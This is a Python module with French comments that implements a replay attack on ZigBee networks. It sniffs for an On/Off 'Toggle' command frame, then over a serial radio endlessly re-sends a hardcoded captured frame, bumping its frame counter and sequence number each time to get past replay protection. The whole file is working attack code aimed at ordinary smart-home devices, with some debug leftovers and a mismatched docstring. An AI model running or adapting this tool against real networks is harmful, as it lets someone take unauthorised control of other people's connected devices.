"""
Attaque de replay sur le réseau ZigBee.

Ce module implémente une attaque de replay sur le réseau ZigBee. Il permet de 
capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer 
sur le réseau ZigBee. Il gère également les mécanismes de protection contre les 
attaques de type replay et permet de personnaliser la configuration de l'attaque.
"""
import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
from typing import Dict, Optional, List
from Cryptodome.Cipher import AES

from CodeurTrame import CodeurTrameZigbee
from DecodeurTrame import DecodeurTrameZigbee
from sniff import SniffeurZigbee
from frame_counter import ZigbeeFrameFinder

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

class ZigbeeReplayAttack:
    """
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.
    
    Cette classe permet de capturer des trames ZigBee, de les analyser, 
    de les modifier (par exemple, en modifiant les numéros de séquence) 
    et de les rejouer sur le réseau ZigBee. Elle gère également les 
    mécanismes de protection contre les attaques de type replay et permet 
    de personnaliser la configuration de l'attaque.
    """
    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        """
        Initialise l'attaque de replay ZigBee.

        Parameters
        ----------
        capture_file : str, optional
            Nom du fichier de capture pour stocker les trames ZigBee capturées.
            Par défaut 'captures_zigbee.json'.
        channel : int, optional
            Canal ZigBee sur lequel l'attaque de replay sera effectuée.
            Par défaut 13.
        pan_id : int, optional
            PAN ID du réseau ZigBee. Par défaut 0x1900.
        serial_port : str, optional
            Port série utilisé pour envoyer les trames de replay.
        aes_key : str, optional
            Clé AES pour la sécurité des trames, si applicable.
        """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200
        )
        self.framefinder = ZigbeeFrameFinder()
        self.captures = []
        self.replay_queue = queue.Queue()

    def attendre_trame_data(self, timeout: int = 30) -> Optional[str]:
        """
        Capture live des trames ZigBee pendant une durée spécifiée.

        Parameters
        ----------
        duree_capture : int, optional
            Durée de la capture en secondes. Par défaut 10.

        Returns
        -------
        Optional[str]
            Trame ZigBee Data capturée, ou None si aucune trame n'a été trouvée.
        """
        self.sniffer.reinitialiser() 
        logger.info("Attente d'une trame Toggle...")
        self.sniffer.demarrer_sniffer()
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.sniffer.captures:
                for capture in self.sniffer.captures:
                    try:
                        if (capture.get('type_trame') == 'Data' and
                            capture.get('couche_aps', {}).get('cluster_id', '').lower() == '0600' and
                            capture.get('couche_zcl', {}).get('command_id', '').lower() == '02'):
                            hex_data = capture['metadonnees']['trame_brute']
                            print(capture.get('couche_aps', {}).get('cluster_id', ''))
                            print(capture.get('couche_zcl', {}).get('command_id', ''))
                            print(hex_data)
                            logger.info("Trame Toggle détectée")
                            
                            self.sniffer.arreter_sniffer()
                            self.sniffer.reinitialiser()
                            return hex_data
                            
                    except KeyError:
                        continue
            time.sleep(0.1)
            
        self.sniffer.arreter_sniffer()
        logger.error("Timeout: Aucune trame Toggle trouvée")
        return None

    def envoyer_trames_en_boucle(self):
        """
        Envoie en boucle des trames de replay sur le réseau ZigBee.
        """
        trame_initiale = "6188f2eff43bd2000048183bd200001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202"#self.attendre_trame_data()
        if not trame_initiale:
            return

        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début de l'envoi sur {self.serial_port}")
                
                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                #trame_modifiee = '61' + trame_modifiee
                trame_bytes = bytes.fromhex(trame_modifiee)


                

                # Envoi en boucle
                while True:
                    try:
                        ser.write(bytes.fromhex('61')+trame_bytes)
                        logger.debug(f"Trame envoyée : {trame_bytes.hex()}")
                        time.sleep(2) 
                        print("Trame envoyée : ", trame_bytes.hex())
                        
                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)
                        trame_bytes = bytes.fromhex(trame_modifiee)

                        print("Trame modifiée : ", trame_bytes.hex()[-8:-6])
                        

                    except Exception as e:
                        logger.error(f"Erreur d'envoi : {e}")
                        break
                        
        except serial.SerialException as e:
            logger.error(f"Erreur port série : {e}")

    def lancer_attaque_replay(self, capture_live: bool = True):
        """
        Lance une attaque de replay sur le réseau ZigBee.

        Parameters
        ----------
        capture_live : bool, optional
            Indique si l'attaque doit capturer des trames en direct ou utiliser un fichier de capture.
            Par défaut True.

        Raises
        ------
        Exception
            Si une erreur se produit lors de l'attaque.

        """
        try:
            if capture_live:
                logger.info("Mode capture live activé")
            else:
                with open(self.capture_file, 'r') as f:
                    self.captures = json.load(f)

            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
            thread_replay.start()
            thread_replay.join()

        except Exception as e:
            logger.error(f"Échec de l'attaque : {e}")